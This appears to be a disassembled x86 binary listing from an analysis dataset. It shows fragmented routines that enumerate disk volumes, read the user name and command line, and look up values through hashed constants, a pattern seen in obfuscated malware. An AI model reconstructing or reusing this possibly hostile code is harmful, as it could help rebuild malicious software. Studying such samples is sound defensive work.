lea ecx [ ebp - 0x1084 ]
call sub_410811
mov [ ebp - 0xcfc ] 0x0
lea eax [ ebp - 0x106c ]
push eax
push sub_41bfe0
push 0x0
push 0x1
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_40feb4
lea ecx [ ebp - 0x1084 ]
call sub_401000
push eax
push 0x0
push 0xa
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80f80001
lea ecx [ ebp - 0x1084 ]
call sub_401000
push eax
lea ecx [ ebp - 0x1084 ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
mov [ ebp - 0x1db5 ] al
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0xcdc ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0xcec ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x1db4 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x1084 ]
call sub_4010a3
mov al [ ebp - 0x1db5 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop esi
leave
retn
mov eax [ ebp - 0x434 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ ebp - 0x434 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push 0x104
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x128c ]
push eax
call [ FindFirstVolumeMountPointW@IAT ]
mov [ ebp - 0x1da0 ] eax
cmp [ ebp - 0x1da0 ] 0xffffffff
je r-xdata
push [ ebp - 0x1dbc ]
lea ecx [ ebp - 0xcec ]
call sub_40100f
push eax
lea eax [ ebp - 0x157c ]
push eax
call [ lstrcpynW@IAT ]
lea eax [ ebp - 0x157c ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ ebp - 0x136c ] eax
push 0x0
lea eax [ ebp - 0x129c ]
push eax
lea eax [ ebp - 0x12a4 ]
push eax
lea eax [ ebp - 0x157c ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ ebp - 0x1364 ]
push eax
lea eax [ ebp - 0x1da4 ]
push eax
push 0x0
lea eax [ ebp - 0x1368 ]
push eax
push 0x80
lea eax [ ebp - 0x1324 ]
push eax
lea eax [ ebp - 0x128c ]
push eax
call [ GetVolumeInformationW@IAT ]
push 0x0
push 0x2e8
lea eax [ ebp - 0x157c ]
push eax
lea ecx [ ebp - 0xcdc ]
call sub_410811
mov eax [ ebp - 0x1da4 ]
and eax 0x80
je r-xdata
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
push 0x2e8
push 0x0
lea eax [ ebp - 0x157c ]
push eax
call sub_4031e0
add esp 0xc
lea eax [ ebp - 0x128c ]
push eax
lea eax [ ebp - 0x1574 ]
push eax
call [ lstrcpyW@IAT ]
and [ ebp - 0x430 ] 0x0
lea eax [ ebp - 0x430 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x128c ]
push eax
call [ GetVolumePathNamesForVolumeNameW@IAT ]
lea ecx [ ebp - 0xcec ]
call sub_4106f0
push 0x1
mov eax [ ebp - 0x430 ]
shl eax 0x1
push eax
lea ecx [ ebp - 0xcec ]
call sub_4105e1
movzx eax al
test eax eax
jne r-xdata
push [ ebp - 0xcf0 ]
call [ FindVolumeClose@IAT ]
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
push 0x208
mov eax [ ebp - 0x434 ]
push [ eax + 0x3c ]
lea eax [ ebp - 0x224 ]
push eax
call [ lstrcpynW@IAT ]
mov eax [ ebp - 0x434 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x434 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x18 ] eax
push 0x0
push 0x210
lea eax [ ebp - 0x224 ]
push eax
lea ecx [ ebp - 0x1084 ]
call sub_410811
jmp r-xdata
mov eax [ ebp - 0x434 ]
mov ecx [ ebp - 0x434 ]
add ecx [ eax ]
mov [ ebp - 0x434 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x1da0 ]
call [ FindVolumeMountPointClose@IAT ]
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x157c ]
push eax
lea eax [ ebp - 0x644 ]
push eax
call [ lstrcpyW@IAT ]
push 0x2e8
push 0x0
lea eax [ ebp - 0x157c ]
push eax
call sub_4031e0
add esp 0xc
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x10 ]
dec ecx
mov [ ebp - 0x10 ] ecx
test eax eax
jbe r-xdata
mov eax [ ebp - 0x434 ]
mov ecx [ ebp - 0x434 ]
add ecx [ eax ]
mov [ ebp - 0x434 ] ecx
jmp r-xdata
mov eax [ ebp - 0x434 ]
cmp [ eax ] 0x0
je r-xdata
push 0x0
push 0x2e8
lea eax [ ebp - 0x157c ]
push eax
lea ecx [ ebp - 0xcdc ]
call sub_410811
push 0x104
lea eax [ ebp - 0x42c ]
push eax
push [ ebp - 0x1da0 ]
call [ FindNextVolumeMountPointW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1784 ]
push eax
lea eax [ ebp - 0x1574 ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x644 ]
push eax
lea eax [ ebp - 0x157c ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x157c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x157c ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ ebp - 0x136c ] eax
push 0x0
lea eax [ ebp - 0x129c ]
push eax
lea eax [ ebp - 0x12a4 ]
push eax
lea eax [ ebp - 0x157c ]
push eax
call [ GetDiskFreeSpaceExW@IAT ]
push 0x40
lea eax [ ebp - 0x1364 ]
push eax
lea eax [ ebp - 0x1da4 ]
push eax
push 0x0
lea eax [ ebp - 0x1368 ]
push eax
push 0x80
lea eax [ ebp - 0x1324 ]
push eax
lea eax [ ebp - 0x128c ]
push eax
call [ GetVolumeInformationW@IAT ]
lea eax [ ebp - 0x128c ]
push eax
lea eax [ ebp - 0xccc ]
push eax
call [ lstrcpyW@IAT ]
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0xccc ]
push eax
call [ lstrcatW@IAT ]
push 0x104
lea eax [ ebp - 0x1784 ]
push eax
lea eax [ ebp - 0xccc ]
push eax
call [ GetVolumeNameForVolumeMountPointW@IAT ]
test eax eax
je r-xdata
sub_41c9de
push ebp
mov ebp esp
mov eax 0x1024
call sub_40a0e0
mov [ ebp - 0x101c ] 0x1
mov [ ebp - 0xd ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_4106f0
push 0x0
push 0x0
push 0x0
push 0x1
push r--data
call [ rw-data ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0xd ]
leave
retn
mov eax [ ebp - 0x101c ]
mov [ ebp - 0x1020 ] eax
push [ ebp - 0x1020 ]
push 0x8000000
push 0x1
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x4 ]
call [ rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x101c ]
inc eax
mov [ ebp - 0x101c ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push [ ebp - 0x4 ]
call [ rw-data ]
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call [ rw-data ]
mov eax [ ebp - 0x101c ]
mov [ ebp - 0x1024 ] eax
push [ ebp - 0x1024 ]
push 0x2
push 0x80000000
push [ ebp + 0xc ]
push [ ebp - 0x14 ]
call [ rw-data ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x101c ]
inc eax
mov [ ebp - 0x101c ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1
cmp [ ebp - 0xc ] 0x0
jne r-xdata
push 0x0
push [ ebp - 0xc ]
lea eax [ ebp - 0x1018 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_410811
mov ecx [ ebp + 0x8 ]
call sub_401000
cmp eax 0x200000
jl r-xdata
jmp r-xdata
and [ ebp - 0xc ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x1000
lea eax [ ebp - 0x1018 ]
push eax
push [ ebp - 0x8 ]
call [ rw-data ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ rw-data ]
sub_41cb28
push ebp
mov ebp esp
push 0xffffffff
push sub_423c90
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x350
lea ecx [ ebp - 0x2f0 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
and [ ebp - 0x2f8 ] 0x0
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x2e0 ] 0x0
and [ ebp - 0x28 ] 0x0
lea ecx [ ebp - 0x54 ]
call sub_416c24
mov [ ebp - 0x4 ] 0x1
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0x14 ] 0x0
mov [ ebp - 0x55 ] 0x0
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
push r--data
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_413f1a
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x30 ]
mov [ eax ] ecx
mov al [ ebp - 0x55 ]
mov [ ebp - 0x351 ] al
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2f0 ]
call sub_4010a3
mov al [ ebp - 0x351 ]
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x300 ] eax
mov [ ebp - 0x304 ] 0x40412402
lea eax [ ebp - 0x300 ]
push eax
lea eax [ ebp - 0x304 ]
push eax
lea eax [ ebp - 0x324 ]
push eax
call sub_41e8dd
mov ecx eax
call sub_41e779
mov [ ebp - 0x358 ] eax
mov eax [ ebp - 0x358 ]
mov [ ebp - 0x35c ] eax
mov [ ebp - 0x4 ] 0x2
push [ ebp - 0x35c ]
lea ecx [ ebp - 0x54 ]
call sub_40186c
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x324 ]
call sub_416bd2
lea ecx [ ebp - 0x54 ]
call sub_416938
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x2f9 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2f0 ]
call sub_4010a3
mov al [ ebp - 0x2f9 ]
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov [ ebp - 0x32c ] 0x7c5d2258
push 0x1
lea eax [ ebp - 0x2f8 ]
push eax
lea eax [ ebp - 0x32c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
push [ ebp - 0x2f8 ]
lea eax [ ebp - 0x2dc ]
push eax
call [ lstrcpyW@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_401577
push eax
push r--data
lea eax [ ebp - 0xdc ]
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0xdc ]
push eax
lea eax [ ebp - 0x2dc ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp - 0x1dc ]
push eax
call [ lstrcpyW@IAT ]
mov [ ebp - 0x330 ] 0xc422369
push 0x1
lea eax [ ebp - 0x2f8 ]
push eax
lea eax [ ebp - 0x330 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
push [ ebp - 0x2f8 ]
lea eax [ ebp - 0x2dc ]
push eax
call [ lstrcatW@IAT ]
mov ecx [ ebp + 0x8 ]
call sub_4115ed
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push r--data
lea eax [ ebp - 0xdc ]
push eax
call [ wsprintfW@IAT ]
add esp 0x10
lea eax [ ebp - 0xdc ]
push eax
lea eax [ ebp - 0x1dc ]
push eax
call [ lstrcatW@IAT ]
push [ ebp - 0x2f8 ]
lea eax [ ebp - 0x1dc ]
push eax
call [ lstrcatW@IAT ]
mov [ ebp - 0x334 ] 0xf22f2ed
push 0x1
lea eax [ ebp - 0x2f8 ]
push eax
lea eax [ ebp - 0x334 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
mov [ ebp - 0x338 ] 0x11d0f59c
push 0x1
lea eax [ ebp - 0x2f4 ]
push eax
lea eax [ ebp - 0x338 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b65
mov [ ebp - 0x33c ] 0x124a76f5
push 0x1
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x33c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
mov [ ebp - 0x340 ] 0x15289533
push 0x1
lea eax [ ebp - 0x2e0 ]
push eax
lea eax [ ebp - 0x340 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
mov [ ebp - 0x344 ] 0x623397cf
push 0x1
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x344 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
mov [ ebp - 0x348 ] 0x7f4becad
push 0x1
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x348 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b65
mov [ ebp - 0x34c ] 0x69b8e0a0
push 0x1
lea eax [ ebp - 0x34 ]
push eax
lea eax [ ebp - 0x34c ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b65
mov [ ebp - 0x350 ] 0x5288a31
push 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x350 ]
push eax
lea ecx [ ebp - 0x54 ]
call sub_416b05
and [ ebp - 0x2c ] 0x0
mov [ ebp - 0x325 ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x54 ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2f0 ]
call sub_4010a3
mov al [ ebp - 0x325 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2f0 ]
call sub_401000
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x55 ] 0x1
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x55 ]
test eax eax
jne r-xdata
push [ ebp - 0x28 ]
push [ ebp - 0x2e0 ]
push [ ebp - 0x10 ]
push [ ebp - 0x2f4 ]
push [ ebp - 0x2f8 ]
lea eax [ ebp - 0x2dc ]
push eax
lea eax [ ebp - 0x2f0 ]
push eax
call sub_41c9de
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jle r-xdata
xor eax eax
inc eax
je r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x2f0 ]
call sub_401000
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x55 ] 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x30 ]
cmp ecx [ eax ]
jge r-xdata
mov eax [ ebp - 0x2c ]
inc eax
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
cmp eax [ ebp - 0x34 ]
jle r-xdata
mov eax [ ebp - 0x20 ]
imul eax eax 0x3e8
push eax
call [ Sleep@IAT ]
push [ ebp - 0x28 ]
push [ ebp - 0x2e0 ]
push [ ebp - 0x10 ]
push [ ebp - 0x2f4 ]
push [ ebp - 0x2f8 ]
push [ ebp - 0x24 ]
lea eax [ ebp - 0x2f0 ]
push eax
call sub_41c9de
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
movzx eax [ ebp - 0x55 ]
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x2f0 ]
call sub_401000
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x55 ] 0x1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
movzx eax [ ebp - 0x55 ]
test eax eax
jne r-xdata
and [ ebp - 0x30 ] 0x0
push [ ebp - 0x28 ]
push [ ebp - 0x2e0 ]
push [ ebp - 0x10 ]
push [ ebp - 0x2f4 ]
push [ ebp - 0x2f8 ]
lea eax [ ebp - 0x1dc ]
push eax
lea eax [ ebp - 0x2f0 ]
push eax
call sub_41c9de
add esp 0x1c
movzx eax al
test eax eax
je r-xdata
push [ ebp - 0x30 ]
lea ecx [ ebp - 0x2f0 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
call sub_402b50
add esp 0xc
jmp r-xdata
sub_41d0fa
push ebp
mov ebp esp
push 0xffffffff
push sub_4239b4
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x3c
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x44 ] eax
lea ecx [ ebp - 0x40 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] r--data
push 0x1
push 0x1000
lea ecx [ ebp - 0x40 ]
call sub_4105e1
lea ecx [ ebp - 0x40 ]
call sub_401000
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x40 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000001
mov ecx [ ebp - 0x44 ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov [ ebp + 0x8 ] r--data
push 0x1
mov eax [ ebp - 0x18 ]
add eax 0x400
push eax
lea ecx [ ebp - 0x28 ]
call sub_4105e1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x28 ]
call sub_40100f
push eax
call [ wsprintfW@IAT ]
add esp 0x10
push 0x1
mov eax [ ebp - 0x18 ]
add eax 0x400
push eax
lea ecx [ ebp - 0x28 ]
call sub_4105e1
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
lea ecx [ ebp - 0x40 ]
call sub_40100f
inc eax
mov [ ebp - 0x2c ] eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ ebp - 0x40 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x28 ]
call sub_40100f
push eax
call [ wsprintfW@IAT ]
add esp 0x14
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x30 ]
push eax
call [ rw-data ]
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x28 ]
call sub_40100f
push eax
mov ecx rw-data
call sub_410b72
mov [ ebp - 0x45 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x28 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x40 ]
call sub_4010a3
mov al [ ebp - 0x45 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x40 ]
call sub_40100f
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
lea ecx [ ebp - 0x28 ]
call sub_40100f
push eax
call [ wsprintfW@IAT ]
add esp 0x18
jmp r-xdata
jmp r-xdata
sub_41d29f
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ecx rw-data
call sub_4106f0
push [ ebp + 0x8 ]
push sub_41d0fa
push 0x1
push 0x1
push r--data
mov edx 0x80000001
mov ecx [ ebp + 0x8 ]
call sub_40feb4
mov ecx rw-data
call sub_401000
push eax
push 0x0
push 0x64
mov ecx [ ebp + 0x8 ]
call sub_413b96
push eax
push 0x0
push 0x80361901
mov ecx rw-data
call sub_401000
push eax
mov ecx rw-data
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
mov al 0x1
xor al al
jmp r-xdata
pop ebp
retn
sub_41d319
push ebp
mov ebp esp
push 0xffffffff
push sub_4239d6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x15c
lea ecx [ ebp - 0x44 ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x58 ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
mov [ ebp - 0x165 ] 0x1
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x58 ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x44 ]
call sub_416bd2
mov al [ ebp - 0x165 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
and [ ebp - 0x48 ] 0x0
push 0x1
push 0x1
lea eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x160 ]
push eax
lea eax [ ebp - 0x164 ]
push eax
mov edx 0x702f3f00
mov ecx [ ebp + 0x8 ]
call sub_417901
movzx eax al
test eax eax
je r-xdata
mov edx 0xe10
mov ecx [ ebp + 0x8 ]
call sub_413b4b
jmp r-xdata
cmp [ ebp - 0x48 ] 0x5
jae r-xdata
xor eax eax
inc eax
je r-xdata
lea ecx [ ebp - 0x58 ]
call sub_4106f0
push 0x0
push [ ebp - 0x48 ]
lea ecx [ ebp - 0x58 ]
call sub_4105e1
push 0x0
push [ ebp - 0x48 ]
push [ ebp - 0x160 ]
lea ecx [ ebp - 0x58 ]
call sub_410811
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x44 ]
call sub_416d22
push 0x1
lea eax [ ebp - 0x1c ]
push eax
push 0x16b9c859
lea ecx [ ebp - 0x44 ]
call sub_416ccc
push 0x3
lea edx [ ebp - 0x15c ]
mov ecx [ ebp + 0x8 ]
call sub_413bfd
push r--data
lea eax [ ebp - 0x15c ]
push eax
call [ lstrcatW@IAT ]
lea edx [ ebp - 0x15c ]
mov ecx [ ebp + 0x8 ]
call sub_411c67
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
jmp r-xdata
mov edx [ ebp - 0x160 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
push 0x1
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
push eax
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_412449
movzx eax al
test eax eax
je r-xdata
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_417232
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov edx [ ebp - 0x24 ]
mov ecx [ ebp + 0x8 ]
call sub_4137e7
sub_41d4c0
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x14 ]
call sub_40f6bd
movzx eax al
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
call sub_413197
mov ecx [ ebp - 0x14 ]
call sub_414598
push 0x1
mov edx r--data
mov ecx [ ebp - 0x14 ]
call sub_414fcb
push 0x1
mov edx r--data
mov ecx [ ebp - 0x14 ]
call sub_414fcb
and [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x14 ]
call sub_4131cb
mov ecx [ ebp - 0x14 ]
call sub_412ab7
mov ecx [ ebp - 0x14 ]
call sub_41a144
cmp eax 0x309
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
leave
retn
push [ ebp - 0xc ]
call [ LocalFree@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_4144b0
cmp [ ebp - 0x4 ] 0x1
jne r-xdata
mov ecx [ ebp - 0x14 ]
call sub_4143fc
mov ecx [ ebp - 0x14 ]
call sub_41491d
movzx eax al
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
call sub_4142f6
mov ecx [ ebp - 0x14 ]
call sub_413d0e
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_414c13
movzx eax al
test eax eax
je r-xdata
and [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x14 ]
call sub_413235
test eax eax
jg r-xdata
xor eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0xb40
jge r-xdata
mov ecx [ ebp - 0x14 ]
call sub_413d0e
push 0x0
call [ ExitProcess@IAT ]
mov ecx [ ebp - 0x14 ]
call sub_413223
test eax eax
jle r-xdata
jmp r-xdata
push 0x1388
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax + 0x58b4 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
sub_41d61b
push ebp
mov ebp esp
mov eax 0x7d18
call sub_40a0e0
push [ ebp - 0x58 ]
call [ LocalFree@IAT ]
xor eax eax
jne r-xdata
and [ ebp - 0x54 ] 0x0
lea eax [ ebp - 0x54 ]
push eax
call [ GetCommandLineW@IAT ]
push eax
call [ CommandLineToArgvW@IAT ]
mov [ ebp - 0x58 ] eax
cmp [ ebp - 0x58 ] 0x0
je r-xdata
mov [ ebp - 0x458 ] 0x3e8
mov [ ebp - 0x460 ] 0xfa0
lea eax [ ebp - 0x1400 ]
mov [ ebp - 0x1408 ] eax
lea eax [ ebp - 0x450 ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x458 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x458 ]
cdq
push 0x3
pop ecx
idiv ecx
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x60 ]
shl eax 0x2
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov eax [ ebp - 0x45c ]
inc eax
mov [ ebp - 0x45c ] eax
mov eax [ ebp - 0x45c ]
cmp eax [ ebp - 0x460 ]
jle r-xdata
mov eax [ ebp - 0x64 ]
mov ecx [ ebp - 0x45c ]
lea eax [ ecx + eax + 0x1 ]
mov [ ebp - 0x45c ] eax
and [ ebp - 0x454 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x454 ]
cmp eax [ ebp - 0x60 ]
jge r-xdata
mov [ ebp - 0x140c ] 0xc8
cmp [ ebp - 0x64 ] 0x0
je r-xdata
mov [ ebp - 0x1404 ] 0x2
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
xor eax eax
inc eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1408 ]
mov [ eax ] 0x0
xor eax eax
jne r-xdata
mov [ ebp - 0x1404 ] 0x2
mov [ ebp - 0x59 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1404 ] 0x5
jge r-xdata
mov [ ebp - 0x1410 ] 0x200
lea eax [ ebp - 0x1410 ]
push eax
lea eax [ ebp - 0x1610 ]
push eax
call [ GetUserNameW@IAT ]
mov eax [ ebp - 0x140c ]
mov ecx [ ebp - 0x140c ]
inc ecx
mov [ ebp - 0x140c ] ecx
cmp eax 0xa
jle r-xdata
xor eax eax
jne r-xdata
mov eax [ ebp - 0x64 ]
lea eax [ eax + eax + 0x1 ]
cmp [ ebp - 0x1404 ] eax
jge r-xdata
movzx eax [ ebp - 0x59 ]
add eax 0x20
mov ecx [ ebp - 0x1408 ]
mov [ ecx ] al
jmp r-xdata
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0x68 ]
movsx eax [ eax ]
and eax 0x3f
add eax 0x20
mov ecx [ ebp - 0x1408 ]
mov [ ecx ] al
mov eax [ ebp - 0x68 ]
movsx eax [ eax ]
and eax 0xc0
